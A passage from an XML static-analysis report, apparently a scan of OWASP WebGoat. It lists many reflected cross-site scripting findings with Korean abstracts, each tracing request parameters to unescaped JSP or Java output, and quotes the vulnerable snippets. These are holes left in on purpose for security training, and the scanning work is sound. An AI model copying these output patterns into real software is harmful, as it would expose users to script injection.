                            </Source>
                        </Issue>
                        <Issue iid="7301D589B66FA41DBA27DB202B5E3D64" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 메서드가 124 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>124</LineStart>
<Snippet>	    tr.addElement(new TD().addElement(
		    new Input(Input.TEXT, "QTY1", s.getParser()
			    .getStringParameter("QTY1", "1")))
		    .setAlign("right"));
	    quantity = s.getParser().getFloatParameter("QTY1", 1.0f);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="85CFBA92A4CCA773DA67AD8EF66DBAF3" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2EAC1D52DD95C80078C19CA75EF2918E" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BBE2F9C47AA092B5E30F9583BF780099" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3E5AAE6AD1FDC3481840E23314C715D6" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7382940D9B3A05B5AC169CD41F0DA054" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 79 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>79</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;input name="&lt;%=RoleBasedAccessControl.DESCRIPTION%&gt;" type="text" class="lesson_text_db" value="&lt;%=employee.getPersonalDescription()%&gt;" size="58"/&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="168107372480ABF4F930F084C4DAB5B8" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="29B4A6F98D3AE543706113615501707E" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="33EC02ED211989EACB94C5A151645868" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E7650F080FCA7F6E00F264D3F365723C" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>JavaScriptValidation.java의 createContent() 메서드가 153 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>153</LineStart>
<Snippet>	    TextArea input1 = new TextArea("field1", 1, 25).addElement(param1);
	    TextArea input2 = new TextArea("field2", 1, 25).addElement(param2);
	    TextArea input3 = new TextArea("field3", 1, 25).addElement(param3);
	    TextArea input4 = new TextArea("field4", 1, 25).addElement(param4);
	    TextArea input5 = new TextArea("field5", 1, 25).addElement(param5);</Snippet>
<TargetFunction>org.apache.ecs.html.TextArea.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0857E967144A3C48AF21E136E28DE988" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 163 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>163</LineStart>
<Snippet>			    {
			    	%&gt;
			    	&lt;div id="reset" class="info"&gt;&lt;a href="&lt;%=webSession.getRestartLink()%&gt;"&gt;Restart this Lesson&lt;/a&gt;&lt;/div&gt;
	    			&lt;%
	    			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>468</LineStart>
<Snippet>		List&lt;String&gt; parameters = new ArrayList&lt;String&gt;();
		
		String screenValue = request.getParameter(SCREEN);
		if (screenValue != null)
			parameters.add(SCREEN + "=" + screenValue);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F4234FFE417E22CE535656E88D5CCA53" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 메서드가 201 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>201</LineStart>
<Snippet>			    .addElement("Enter your credit card number:"));
	    tr.addElement(new TD().addElement(new Input(Input.TEXT, "field2",
		    param2)));
	    t.addElement(tr);
	    tr = new TR();</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E4C288AABC832D50D5EAD02C06A5B684" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TraceXSS.java의 createContent() 메서드가 151 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>TraceXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/TraceXSS.java</FilePath>
<LineStart>151</LineStart>
<Snippet>	    tr.addElement(new TD().addElement(
		    new Input(Input.TEXT, "QTY3", s.getParser()
			    .getStringParameter("QTY3", "1")))
		    .setAlign("right"));
	    quantity = s.getParser().getFloatParameter("QTY3", 1.0f);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6E2B74CCAF7E4C3DDA9AB0F9EA9983F8" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 89 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>89</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;			
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="174EA7EAAD64178C4172CE34008A1776" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3F12AB25DFF228AEFF9BFF43744F5607" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C5C9E1C1BA6569E7D32F4D9CB38A0540" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F0C452DD95EEB75FBD4E0080F1B2DDFE" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 114 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>114</LineStart>
<Snippet>				{
				%&gt;
				&lt;a href="attack?show=PreviousHint&amp;menu=&lt;%=menu%&gt;" target="_top" onclick="MM_nbGroup('down','group1','hintLeft','',1)" 
				onmouseover="MM_nbGroup('over','hintLeft','images/buttons/hintLeftOver.jpg','',1)" 
				onmouseout="MM_nbGroup('out')"&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>String lessonComplete = "&lt;img src=\"images/buttons/lessonComplete.jpg\"&gt;";
String m = "menu";
String menu = request.getParameter(m);

List categories = course.getCategories();</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="67479E5D27D466B1FF4EC8510AF92AAB" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>123</LineStart>
<Snippet>	    tr.addElement(new TD().addElement(
		    new Input(Input.TEXT, "QTY1", s.getParser()
			    .getStringParameter("QTY1", "1")))
		    .setAlign("right"));
	    quantity = s.getParser().getFloatParameter("QTY1", 1.0f);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="770B97F6D6E1F54EE902654CFC412BF3" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress2()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EB15A640A3C407FB660F4989419B9E63" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="607FF573A2EF8580B78C2850E44CFF51" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
